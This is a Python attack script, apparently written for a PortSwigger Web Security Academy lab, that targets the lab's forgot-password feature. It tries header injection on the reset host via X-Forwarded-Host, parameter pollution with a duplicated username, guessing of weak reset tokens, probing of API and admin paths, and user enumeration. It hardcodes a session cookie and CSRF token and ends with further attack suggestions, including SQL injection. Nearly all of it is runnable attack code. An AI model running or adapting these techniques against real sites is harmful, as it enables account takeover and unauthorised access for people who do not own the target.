#!/usr/bin/env python3
import requests
import time
import random
import string

# Target URLs - Note this is the other lab URL you mentioned
base_url = "https://0a0a004e034f7a8182e93d0c004d00b7.web-security-academy.net"
forgot_url = f"{base_url}/forgot-password"

# Session cookie
session = "34ERCypmj8Hg3MDNkK4ULVsD1BVFXsrL"

headers = {
    "Cookie": f"session={session}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Accept": "*/*"
}

print("üöÄ NO EXPLOIT SERVER ATTACK METHODS")
print("=" * 50)

# Method 1: Check if we can use localhost/127.0.0.1 as Host header
print("\n1Ô∏è‚É£ Testing localhost Host Header Injection...")

localhost_headers = [
    {"X-Forwarded-Host": "localhost"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Forwarded-Host": "internal.portswigger-labs.net"},
    {"X-Forwarded-Host": "burpcollaborator.net"},
    {"X-HTTP-Host-Override": "localhost"}
]

payload = "csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username=carlos&username=administrator"

for header in localhost_headers:
    try:
        test_headers = {**headers, **header}
        response = requests.post(forgot_url, data=payload, headers=test_headers, verify=False)
        result = response.text

        if "localhost" in result or "127.0.0.1" in result:
            print(f"‚úÖ {list(header.keys())[0]}: {result[:100]}")
        elif response.status_code != 200:
            print(f"? {list(header.keys())[0]}: Status {response.status_code}")
    except:
        pass

# Method 2: Check if reset tokens are predictable
print("\n2Ô∏è‚É£ Testing for Predictable Reset Tokens...")

# Try common weak token patterns
weak_tokens = [
    "123456",
    "password",
    "admin",
    "test",
    "reset",
    "token",
    "0000000000000000",  # 16 zeros
    "1111111111111111",  # 16 ones
    "aaaaaaaaaaaaaaaa",  # 16 a's
    str(int(time.time())),  # Current timestamp
    str(int(time.time()) - 1),  # Previous timestamp
    "administrator",
    "carlos",
    "wiener"
]

for token in weak_tokens:
    try:
        reset_url = f"{base_url}/forgot-password?reset_token={token}"
        response = requests.get(reset_url, headers={"Cookie": f"session={session}"}, verify=False)

        if "password" in response.text.lower() and "reset" in response.text.lower() and response.status_code == 200:
            print(f"‚úÖ Valid token found: {token}")
            print(f"   URL: {reset_url}")
            break
    except:
        continue

# Method 3: Check if we can access /api endpoints directly
print("\n3Ô∏è‚É£ Testing API Endpoints...")

api_endpoints = [
    "/api/user/administrator",
    "/api/user/admin",
    "/api/users/administrator",
    "/api/admin",
    "/api/reset-password",
    "/api/forgot-password",
    "/api/auth/reset",
    "/api/v1/user/administrator",
    "/api/v1/admin"
]

for endpoint in api_endpoints:
    try:
        url = f"{base_url}{endpoint}"
        response = requests.get(url, headers={"Cookie": f"session={session}"}, verify=False)

        if response.status_code == 200 and len(response.text) > 0:
            print(f"‚úÖ Found: {endpoint}")
            print(f"   Response: {response.text[:200]}")
        elif response.status_code in [401, 403]:
            print(f"? Protected: {endpoint} (Status: {response.status_code})")
    except:
        continue

# Method 4: Check if we can enumerate user information
print("\n4Ô∏è‚É£ Testing User Enumeration...")

users_to_test = ["administrator", "admin", "root", "carlos", "wiener", "user"]

for user in users_to_test:
    try:
        test_payload = f"csrf=YwhAhSyhUwrK4ym9guuBkZtag1sonlkl&username={user}"
        response = requests.post(forgot_url, data=test_payload, headers=headers, verify=False)
        result = response.text

        print(f"User '{user}': {result[:100]}...")
    except:
        continue

# Method 5: Check if we can trigger password reset and guess email format
print("\n5Ô∏è‚É£ Testing Email Format Guessing...")

# Some labs have predictable email formats
possible_domains = [
    "portswigger.net",
    "web-security-academy.net",
    "burp-labs.net",
    "normal-user.net",
    "carlos-montoya.net",
    "admin.portswigger.net"
]

for domain in possible_domains:
    admin_email = f"administrator@{domain}"
    try:
        # Try to see if we can get any info about this email
        print(f"Testing: {admin_email}")
    except:
        continue

# Method 6: Check for any hidden admin functionality
print("\n6Ô∏è‚É£ Testing Hidden Admin Functionality...")

admin_paths = [
    "/admin-panel",
    "/administrator",
    "/admin.php",
    "/admin/login",
    "/admin/panel",
    "/control-panel",
    "/management",
    "/admin123",
    "/secret-admin",
    "/hidden-admin"
]

for path in admin_paths:
    try:
        url = f"{base_url}{path}"
        response = requests.get(url, headers={"Cookie": f"session={session}"}, verify=False)

        if response.status_code == 200:
            print(f"‚úÖ Found admin area: {path}")
            if "admin" in response.text.lower() or "administrator" in response.text.lower():
                print(f"   Contains admin content!")
        elif response.status_code in [301, 302]:
            print(f"? Redirect from: {path} (Status: {response.status_code})")
    except:
        continue

print("\n7Ô∏è‚É£ MANUAL TESTING SUGGESTIONS:")
print("-" * 35)
print("1. Check if the lab has a Burp Collaborator instance you can use")
print("2. Try using your own domain (if you have one) for Host Header Injection")
print("3. Check if the reset form accepts common weak passwords")
print("4. Try accessing /admin directly after parameter pollution attack")
print("5. Look for any client-side JavaScript that might reveal admin URLs")
print("6. Check if cookies contain any useful information")
print("7. Try SQL injection in the username parameter")

print(f"\nüîë Session cookie: {session}")
print("\nIf none of these work, the lab might require:")
print("- A different attack vector")
print("- Burp Collaborator")
print("- Social engineering simulation")
print("- Or it might be a different type of vulnerability altogether")